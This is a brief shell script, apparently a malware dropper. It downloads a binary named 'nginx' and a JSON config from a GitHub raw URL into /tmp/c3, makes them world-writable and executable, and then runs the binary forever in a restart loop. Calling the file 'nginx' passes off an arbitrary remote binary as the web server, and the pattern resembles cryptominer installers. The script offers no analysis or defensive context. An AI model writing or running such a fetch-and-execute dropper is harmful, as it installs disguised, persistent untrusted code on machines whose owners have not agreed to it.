#!/bin/bash

mkdir -p /tmp/c3
cd /tmp/c3
wget https://raw.githubusercontent.com/dlfile/x/main/e/nginx.json
wget https://raw.githubusercontent.com/dlfile/x/main/e/nginx
chmod -R  777 /tmp/c3
#!/bin/sh
while [ 1 ]; do
	/tmp/c3/nginx --config=/tmp/c3/nginx.json
	sleep 5
done
